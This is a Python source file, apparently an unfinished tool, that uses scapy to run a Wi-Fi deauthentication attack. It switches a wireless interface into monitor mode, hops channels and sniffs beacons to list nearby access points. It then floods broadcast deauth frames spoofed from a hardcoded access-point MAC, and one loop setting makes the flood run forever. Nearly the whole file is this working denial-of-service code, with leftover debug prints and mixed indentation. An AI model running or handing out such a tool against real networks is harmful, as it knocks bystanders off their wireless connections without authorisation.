from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, sendp, conf, Dot11Beacon, Dot11ProbeResp, Dot11Elt
from scapy.all import send, sniff
import os
from multiprocessing import Process
import random
import time


class deauth:

    def __init__(self, valueObj):
        self.valueObj = valueObj
        self.found_APs = []


    def attack(self):
        print("do stuff")

        print(conf.L2socket)

        # Scan for APs

        client = "FF:FF:FF:FF:FF:FF"
        ap = "cc:32:e5:32:4e:b2"
        # deauth packet for AP

        packet = Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()

        #interface must be the monitor one
        sendp(packet, iface=self.valueObj.interfaceName, count=100, inter=0.1 ,verbose=1)

        count = int(self.valueObj.count)
        while count != 0:
            try:
                for i in range(64):
					# Send out deauth from the AP
                    send(packet)
				# If count was -1, this will be an infinite loop
                count -= 1
            except KeyboardInterrupt:
                break

		
    def channel_hopper(self):
        while True:
            try:
                channel = random.randrange(1,13)
                os.system("iwconfig {} channel {}".format(self.valueObj.interfaceName, channel))
                time.sleep(1)
            except KeyboardInterrupt:
                break



    def packet_handler(self, packet):
        try:
            if (packet.haslayer(Dot11)):
 
                if (packet.type == 0 and packet.subtype == 8):
                    if (packet.addr2 not in self.found_APs):
                        self.found_APs.append(packet.addr2)
                        print("Access point MAC: " + str(packet.addr2) + " with SSID " + str(packet.info) + " on channel " + str(int(ord(packet[Dot11Elt:3].info))))
                        
        except:
            raise
        

    def findAP(self):
        os.system("ifconfig " + self.valueObj.interfaceName + " down")
        os.system("iwconfig " + self.valueObj.interfaceName + " mode monitor")
        os.system("ifconfig " + self.valueObj.interfaceName + " up")

        channel_hop = Process(target = self.channel_hopper)
        channel_hop.start()

        result = sniff(iface=self.valueObj.interfaceName, prn=self.packet_handler, store=0)
        print(result)
        print(self.found_APs)